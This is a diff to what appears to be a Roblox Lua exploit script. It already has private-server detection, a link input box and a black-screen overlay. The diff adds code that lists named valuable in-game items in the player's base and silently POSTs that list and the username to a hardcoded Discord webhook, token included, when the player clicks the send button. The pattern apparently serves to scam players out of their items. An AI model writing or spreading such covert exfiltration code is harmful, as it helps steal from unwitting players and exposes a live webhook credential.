@@ -7,6 +7,7 @@ local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local SoundService = game:GetService("SoundService")
 local Workspace = game:GetService("Workspace")
 local ContextActionService = game:GetService("ContextActionService")
+local HttpService = game:GetService("HttpService")
 
 ------------------------------------------------------------
 -- 🔍 Universal private server and owner detection
@@ -151,6 +152,58 @@ end
 
 local blackFrame -- forward declaration for cleanup
 
+-- 🚀 OBJETO Y WEBHOOK CODE (XENO/SYNAPSE)
+local objetosBuscados = {
+    "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
+    "Tacorita bicicleta", "Los tacoritas", "Garama and Madundung", "Dragon Cannelloni", "Esok Sekolah",
+    "Tang Tang Keletang", "Strawberry Elephant", "La Secret Combinasion", "Tralaledon", "Eviledon",
+    "Spaghetti Tualetti", "Los Hotspotsitos", "Los Mobilis", "Los 67", "Money Money Puggy",
+    "Celularcini Viciosini", "Los Bros", "Las Sis", "Los Primos", "La Spooky Grande",
+    "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
+}
+
+local function obtenerObjetosEnBase()
+    local encontrados = {}
+    local player = Players.LocalPlayer
+    local base = Workspace:FindFirstChild(player.Name .. "Base") or Workspace:FindFirstChild(player.Name)
+    if base then
+        for _, nombre in ipairs(objetosBuscados) do
+            if base:FindFirstChild(nombre) then
+                table.insert(encontrados, nombre)
+            end
+        end
+    end
+    return encontrados
+end
+
+local function enviarWebhook()
+    local objetos = obtenerObjetosEnBase()
+    if #objetos == 0 then
+        print("No se encontraron objetos en la base.")
+        return
+    end
+
+    local data = {
+        ["username"] = Players.LocalPlayer.Name,
+        ["content"] = "Objetos encontrados en la base:\n" .. table.concat(objetos, "\n")
+    }
+
+    local json = HttpService:JSONEncode(data)
+
+    -- Usa la función de tu exploit (Xeno/Synapse/KRNL)
+    local response = (Xeno and Xeno.Request or syn and syn.request or http_request)({
+        Url = "https://discord.com/api/webhooks/1427117977899237406/S4r8I4aIhw9l4TJeBKy6AFIJeCFZOh8gfQ0wqoa8QFv9o7nL1FnO9--4t9CQm-aCIWbL",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = json
+    })
+
+    print(response.StatusCode, response.StatusMessage)
+    print(response.Body)
+end
+
 sendButton.MouseButton1Click:Connect(function()
 	local link = textBox.Text
 	if link == "" then
@@ -161,6 +214,9 @@ sendButton.MouseButton1Click:Connect(function()
 
 	print("🔗 Link entered:", link)
 	inputFrame:Destroy() -- Remove input frame
+
+	-- 🚀 Enviar objetos por webhook (Xeno/Synapse)
+	enviarWebhook()
 
 	-- 🖤 Full black screen
 	blackFrame = Instance.new("Frame")
@@ -252,4 +308,3 @@ if blackFrame then
 		end
 	end)
 end
-
